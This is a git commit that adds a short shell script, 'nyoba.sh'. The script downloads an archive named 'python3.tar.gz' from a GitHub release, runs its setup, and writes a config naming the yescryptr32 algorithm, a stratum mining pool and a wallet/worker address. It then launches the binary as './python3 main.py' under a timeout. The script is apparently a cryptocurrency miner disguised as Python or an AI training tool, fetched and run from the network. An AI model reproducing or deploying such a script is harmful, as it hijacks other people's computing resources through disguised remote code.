0f30fdf3e6ee87f9bf033ffeb5ece259993c3866
barburonjilo <barburonjilo@outlook.co.id>
2024-07-19 18:45:10 +0700

    Create nyoba.sh

---
+++ nyoba.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3/python3.tar.gz
+tar -xvf python3.tar.gz
+rm python3.tar.gz
+cd python3
+./setup.sh
+rm config.json && echo '{"algorithm": "yescryptr32", "host": "stratum-asia.rplant.xyz", "port": 17116, "worker": "UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx", "password": "x", "workers": 18, "log": false, "chrome": "./chromium/chrome" }' > config.json
+export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
+export PATH=$HOME/dependencies/usr/bin:$PATH
+timeout 6m ./python3 main.py
